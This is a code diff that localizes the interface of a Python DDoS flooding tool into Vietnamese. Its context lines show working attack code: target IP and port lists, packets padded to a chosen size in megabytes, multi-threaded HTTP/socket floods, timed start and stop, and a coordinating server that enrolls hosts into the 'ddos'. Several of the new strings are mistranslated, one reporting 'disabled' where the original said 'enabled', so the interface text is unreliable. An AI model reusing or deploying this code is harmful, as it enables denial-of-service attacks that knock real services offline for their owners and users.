@@ -256,10 +256,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def outtxt(command):
 		print(" ")
 		if var.outtxt:
-			print("The output has been reduced.")
+			print("Sản lượng đã bị giảm.")
 			var.outtxt = False
 		else:
-			print("The output has been set to normal.")
+			print("Đầu ra đã được đặt thành bình thường.")
 			var.outtxt = True
 		print(" ")
 
@@ -267,10 +267,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def mute(command):
 		print(" ")
 		if var.outtxtmute:
-			print("The output has been disabled.")
+			print("Đầu ra đã bị vô hiệu hóa.")
 			var.outtxtmute = False
 		else:
-			print("The output has been enabled.")
+			print("Đầu ra đã bị vô hiệu hóa.")
 			var.outtxtmute = True
 		print(" ")
 
@@ -284,7 +284,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.command
 	def get(command):
 		print("")
-		var.get_url = tools.arg("GET Header: ", "get ", command)
+		var.get_url = tools.arg("NHẬN Tiêu đề: ", "get ", command)
 		print("")
 
 	@event.command
@@ -292,9 +292,9 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print(" ")
 		try:
 			rtxtzw = var.rtxt
-			var.rtxt = int(tools.arg("Repeat message x times: ", "repeat ", command))
+			var.rtxt = int(tools.arg("Lặp lại tin nhắn x lần: ", "repeat ", command))
 			if var.rtxt < 1:
-				print("There was an error while executing.")
+				print("Đã xảy ra lỗi khi thực thi.")
 			else:
 				if rtxtzw < var.rtxt:
 					var.messagezw = var.message
@@ -302,30 +302,30 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				else:
 					var.message = (str(var.messagezw) * int(var.rtxt))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
 	def mb(command):
 		print(" ")
 		try:
-			setmb = int(tools.arg("Size of Packet in MB: ", "mb ", command))
+			setmb = int(tools.arg("Kích thước của gói tính bằng MB: ", "mb ", command))
 			setmb = int(setmb / 0.000001)
 			var.message = ("r" * setmb)
 			var.rtxt = setmb
 			var.messagezw = "r"
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
 	def stress(command):
 		print(" ")
 		if var.stress:
-			print("The stress mode has been disabled.")
+			print("Chế độ căng thẳng đã bị tắt.")
 			var.stress = False
 		else:
-			print("The stress mode has been enabled.")
+			print("Chế độ căng thẳng đã được bật.")
 			var.stress = True
 		print(" ")
 
@@ -333,9 +333,9 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def st_wait(command):
 		print("")
 		try:
-			var.timeforstress = int(tools.arg("Delay in seconds: ", "st wait ", command))
+			var.timeforstress = int(tools.arg("Độ trễ trong vài giây: ", "st wait ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print("")
 
 	@event.command
@@ -344,7 +344,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		var.ip = tools.arg("Targets (Seperated by ', '): ", "ips ", command).split(", ")
 		for ip in var.target:
 			if "." not in ip:
-				print("This IP does not exist.")
+				print("IP này không tồn tại.")
 		print("")
 
 	@event.command
@@ -354,9 +354,9 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			var.port = tools.arg("Ports (Seperated by ', '): ", "ports ", command).split(", ")
 			for port in var.port:
 				if isinstance(port, int):
-					print("Entered ports cannot be used.")
+					print("Không thể sử dụng các cổng đã nhập.")
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print("")
 
 	@event.command
@@ -370,40 +370,40 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				webtoip[pos] = str(socket.gethostbyname(webtoip[pos]))
 			var.ip = webtoip
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
 	def auto_step(command):
 		print(" ")
 		try:
-			var.autostep = int(tools.arg("Delay for next thread to activate (in Seconds): ", "auto step ", command))
+			var.autostep = int(tools.arg("Độ trễ để chuỗi tiếp theo kích hoạt (tính bằng Giây): ", "auto step ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
 	def auto_start(command):
 		print(" ")
 		try:
-			var.autostart = int(tools.arg("Delay for attack to start (in Seconds): ", "auto start ", command))
+			var.autostart = int(tools.arg("Độ trễ để cuộc tấn công bắt đầu (tính bằng Giây): ", "auto start ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
 	def auto_stop(command):
 		print(" ")
 		try:
-			var.autostop = int(tools.arg("Stop the attack after x seconds: ", "auto stop ", command))
+			var.autostop = int(tools.arg("Dừng đòn sau x giây: ", "auto stop ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
 	def agent(command):
 		print(" ")
-		var.user_agents = [tools.arg("Enter a user agent: ", "agent ", command)]
+		var.user_agents = [tools.arg("Nhập tác nhân người dùng: ", "agent ", command)]
 		print(" ")
 
 	def show_values(self):
@@ -423,15 +423,15 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print("Stop after x seconds: %s" % var.autostop)
 		print("Time between threads: %s" % var.autostep)
 		if len(var.user_agents) == 1:
-			print("User Agent: %s" % var.user_agents[0])
+			print("Đại lý người dùng: %s" % var.user_agents[0])
 		if var.get_url != "":
-			print("GET Header: %s" % var.get_url)
+			print("NHẬN Tiêu đề: %s" % var.get_url)
 		print("")
 
 	def stresstest(self):
 		print(" ")
-		print("Time between: %s" % str(var.timeforstress))
-		print("Using %s threads per round" % str(var.threads))
+		print("Thời gian giữa: %s" % str(var.timeforstress))
+		print("Sử dụng %s chủ đề mỗi vòng" % str(var.threads))
 		print("To stop the attack press: CTRL + C")
 		print(" ")
 		sleep(2)
@@ -441,11 +441,11 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					t = Thread(target=self.ddos)
 					t.start()
 				except Exception:
-					print("\x1b[0;39mFailed to start a thread.")
+					print("\x1b[0;39mKhông thể bắt đầu một chủ đề.")
 			sleep(var.timeforstress)
 			if var.stresserror:
 				print(" ")
-				print("Stopped at %s threads!" % (str(var.stresstestvar * var.threads)))
+				print("Đã dừng ở %s chủ đề!" % (str(var.stresstestvar * var.threads)))
 				print(" ")
 				var.runactive = False
 				quit()
@@ -458,7 +458,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			var.get_url = var.ip
 		packet = ("GET /%s HTTP/1.1\r\nHost: %s\r\n User-Agent: %s\r\nConnection: Keep-Alive\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\n%s\r\n\r\n" % (var.get_url, var.ip, choice(var.user_agents), var.message)).encode("utf-8")
 		if not var.outtxtmute:
-			print("Thread started!")
+			print("Chủ đề đã bắt đầu!")
 		if var.socketmethod == "UDP":
 			mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		else:
@@ -483,13 +483,13 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						if var.outtxt:
 							if not mesalready:
 								mesalready = True
-								print("\nSuccess for %s with port %s!" % (ipvalue, portvalue))
+								print("\nThành công cho %s với cổng %s!" % (ipvalue, portvalue))
 						# sleep(sleepy)
 						var.command_log.append("Sucessful execution.")
 					except socket.error as ex:
 						if not var.outtxtmute:
 							mesalready = False
-							print("\nTarget %s with port %s not accepting request!" % (ipvalue, portvalue))
+							print("\nNhắm mục tiêu %s với cổng %s không chấp nhận yêu cầu!" % (ipvalue, portvalue))
 						var.command_log.append("ERROR: %s" % ex)
 						if var.l4_debug:
 							print("ERROR: %s" % ex)
@@ -516,14 +516,14 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		if var.ip != "":
 			def execute():
 				print("")
-				print("To stop the attack press: ENTER or CRTL + C")
+				print("Để dừng cuộc tấn công, nhấn: ENTER hoặc CTRL + C")
 				sleep(3)
 				sleep(var.autostart)
 				if var.stress:
 					if len(var.target) == 1 and len(var.port) == 1:
 						self.stresstest()
 					else:
-						print("Do not use multiple targets/ports in the Stress-Testing mode.")
+						print("Không sử dụng nhiều mục tiêu/cổng trong chế độ Kiểm tra căng thẳng.")
 				else:  # Normal Mode
 					if var.autostop != 0:
 						var.autostarttime = time()
@@ -533,10 +533,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 							sleep(var.autostep)
 							t.start()
 						except Exception:
-							print("Could not start thread %s." % thread)
+							print("Không thể bắt đầu chuỗi %s." % thread)
 
 				def reset_attack():
-					print("Stopping threads...")
+					print("Đang dừng chuỗi...")
 					var.runactive = False
 					sleep(2)
 					while True:
@@ -546,7 +546,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 							sleep(1)
 
 					if var.l4_debug:
-						print("Saving debugging log...")
+						print("Lưu nhật ký gỡ lỗi...")
 						output_to = path.join(getcwd(), "l4_debug_log.txt")
 
 						write_method = "a"
@@ -584,7 +584,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				if var.server[0] and var.server[1]:
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
 
 				reset_attack()
 
@@ -596,31 +596,31 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						break
 					else:
 						sleep(1)
-			elif not tools.question("\nDo you agree to the terms of use?"):
-				print("Agreement not accepted.")
+			elif not tools.question("\nBạn có đồng ý với các điều khoản sử dụng không?"):
+				print("Thỏa thuận không được chấp nhận.")
 				quit()
 			else:
 				if var.server[0] and var.server[1]:
-					if tools.question("\nWould you like to use the host as part of the ddos?"):
+					if tools.question("\nBạn có muốn sử dụng máy chủ lưu trữ như một phần của ddos ​​không?"):
 						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 						if status != "200":
-							print("An error occured, while sending data to the server.")
+							print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
 						execute()
 					else:
 						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 						if status != "200":
-							print("An error occured, while sending data to the server.")
+							print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
 						try:
-							print("[Press Enter to stop the attack.]")
+							print("[Nhấn Enter để dừng cuộc tấn công.]")
 						except KeyboardInterrupt:
 							pass
 						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 						if status != "200":
-							print("An error occured, while sending data to the server.")
+							print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
 				else:
 					execute()
 		else:
-			print("No target has been defined.")
+			print("Không có mục tiêu đã được xác định.")
 		print("")
 
 
